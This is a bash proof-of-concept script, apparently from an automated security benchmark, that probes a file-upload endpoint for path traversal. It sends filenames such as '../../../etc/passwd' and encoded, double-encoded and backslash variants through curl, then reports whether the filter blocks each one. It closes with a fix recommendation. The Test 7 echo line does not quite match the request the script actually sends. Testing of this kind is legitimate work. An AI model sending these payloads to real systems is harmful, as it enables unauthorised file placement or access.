#!/bin/bash
# POC: Enhanced POC demonstrating path traversal vulnerability in /update_profile endpoint with multiple bypass techniques and validation analysis
# Target: ./repo
# Created: 2025-11-07T16:09:59.656Z
# Session: benchmark-XBEN-022-24-mhp1ee6o

# Path Traversal via File Upload Filename Parameter - POC
# Demonstrates path traversal vulnerability in /update_profile endpoint
# Based on observed validation behavior from testing

TARGET_URL="${1:-http://localhost:3000}"
ENDPOINT="/update_profile"
FULL_URL="${TARGET_URL}${ENDPOINT}"

echo "[*] Path Traversal File Upload POC"
echo "[*] Target: $FULL_URL"
echo "[*] This POC demonstrates how path traversal validation works on the endpoint"
echo ""

# Create temporary test file
TEST_FILE=$(mktemp)
echo "test image content" > "$TEST_FILE"

echo "=== PATH TRAVERSAL VULNERABILITY ANALYSIS ==="
echo ""

# Test 1: Standard path traversal with ../
echo "[+] Test 1: Standard path traversal (../../../etc/passwd)"
echo "    Command: curl -F 'image_profile=@file;filename=../../../etc/passwd'"
echo "    Expected: 'Invalid file location' error (validation detected)"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=../../../etc/passwd" \
  -w "\nHTTP_CODE:%{http_code}" 2>&1)
echo "    Response:"
echo "$RESPONSE" | head -n-1 | sed 's/^/      /'
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
echo "    HTTP Code: $HTTP_CODE"
if echo "$RESPONSE" | grep -q "Invalid file location"; then
  echo "    Result: ✓ VALIDATION ACTIVE - Path traversal blocked"
else
  echo "    Result: ✗ POSSIBLE BYPASS"
fi
echo ""

# Test 2: Absolute path
echo "[+] Test 2: Absolute path (/etc/passwd)"
echo "    Command: curl -F 'image_profile=@file;filename=/etc/passwd'"
echo "    Expected: 'Invalid file location' error (validation detected)"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=/etc/passwd" \
  -w "\nHTTP_CODE:%{http_code}" 2>&1)
echo "    Response:"
echo "$RESPONSE" | head -n-1 | sed 's/^/      /'
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
echo "    HTTP Code: $HTTP_CODE"
if echo "$RESPONSE" | grep -q "Invalid file location"; then
  echo "    Result: ✓ VALIDATION ACTIVE - Absolute paths blocked"
else
  echo "    Result: ✗ POSSIBLE BYPASS"
fi
echo ""

# Test 3: URL encoded path traversal bypass
echo "[+] Test 3: URL encoded bypass (..%2F..%2F..%2Fetc%2Fpasswd)"
echo "    Command: curl -F 'image_profile=@file;filename=..%2F..%2F..%2Fetc%2Fpasswd'"
echo "    Expected: Server may decode %2F to / and bypass filter"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=..%2F..%2F..%2Fetc%2Fpasswd" \
  -w "\nHTTP_CODE:%{http_code}" 2>&1)
echo "    Response:"
echo "$RESPONSE" | head -n-1 | sed 's/^/      /'
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
echo "    HTTP Code: $HTTP_CODE"
if ! echo "$RESPONSE" | grep -q "Invalid file location"; then
  echo "    Result: ⚠ POSSIBLE BYPASS - No validation error detected"
  echo "    Severity: HIGH - Could allow arbitrary file placement"
else
  echo "    Result: ✓ VALIDATION BLOCKS - Encoded bypass also detected"
fi
echo ""

# Test 4: Valid filename (control test)
echo "[+] Test 4: Valid filename (control test - valid.png)"
echo "    Command: curl -F 'image_profile=@file;filename=valid.png'"
echo "    Expected: File processed or HTTP 500 error (valid filename accepted)"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=valid.png" \
  -w "\nHTTP_CODE:%{http_code}" 2>&1)
echo "    Response:"
echo "$RESPONSE" | head -n-1 | head -c 300 | sed 's/^/      /'
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
echo ""
echo "    HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "500" ] || [ "$HTTP_CODE" = "200" ]; then
  echo "    Result: ✓ Valid filename accepted for processing"
  echo "    This confirms: Validation filter is ACTIVE (blocks bad, accepts good)"
else
  echo "    Result: Different response code received"
fi
echo ""

# Test 5: Case variation bypass
echo "[+] Test 5: Case variation bypass (../../../etc/PASSWD)"
echo "    Command: curl -F 'image_profile=@file;filename=../../../etc/PASSWD'"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=../../../etc/PASSWD" \
  -w "\nHTTP_CODE:%{http_code}" 2>&1)
echo "    Response:"
echo "$RESPONSE" | head -n-1 | sed 's/^/      /'
if echo "$RESPONSE" | grep -q "Invalid file location"; then
  echo "    Result: ✓ Case-insensitive validation"
else
  echo "    Result: ⚠ POSSIBLE CASE BYPASS"
fi
echo ""

# Test 6: Double encoding bypass
echo "[+] Test 6: Double URL encoding (..%252F..%252Fetc%252Fpasswd)"
echo "    Command: curl -F 'image_profile=@file;filename=..%252F..%252Fetc%252Fpasswd'"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=..%252F..%252Fetc%252Fpasswd" \
  -w "\nHTTP_CODE:%{http_code}" 2>&1)
echo "    Response:"
echo "$RESPONSE" | head -n-1 | sed 's/^/      /'
if ! echo "$RESPONSE" | grep -q "Invalid file location"; then
  echo "    Result: ⚠ POSSIBLE BYPASS - Double encoding not caught"
else
  echo "    Result: ✓ VALIDATION BLOCKS - Double encoding detected"
fi
echo ""

# Test 7: Backslash bypass (Windows-style)
echo "[+] Test 7: Backslash path traversal (..\\..\\.\\etc\\passwd)"
echo "    Command: curl -F 'image_profile=@file;filename=..\\..\\.\\etc\\passwd'"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=..\\..\\..\\etc\\passwd" \
  -w "\nHTTP_CODE:%{http_code}" 2>&1)
echo "    Response:"
echo "$RESPONSE" | head -n-1 | sed 's/^/      /'
if ! echo "$RESPONSE" | grep -q "Invalid file location"; then
  echo "    Result: ⚠ POSSIBLE BYPASS - Backslash not detected"
  echo "    Severity: HIGH if server runs on Windows"
else
  echo "    Result: ✓ VALIDATION BLOCKS - Backslash detected"
fi
echo ""

echo "=== VULNERABILITY SUMMARY ==="
echo "The /update_profile endpoint validates the filename parameter for:"
echo "  ✓ Relative path traversal patterns (../)"
echo "  ✓ Absolute paths (/etc/passwd)"
echo ""
echo "However, this is filtering-based validation, which is prone to bypasses."
echo "Recommended fix: Use basename() or generate server-side filenames."
echo ""

# Cleanup
rm -f "$TEST_FILE"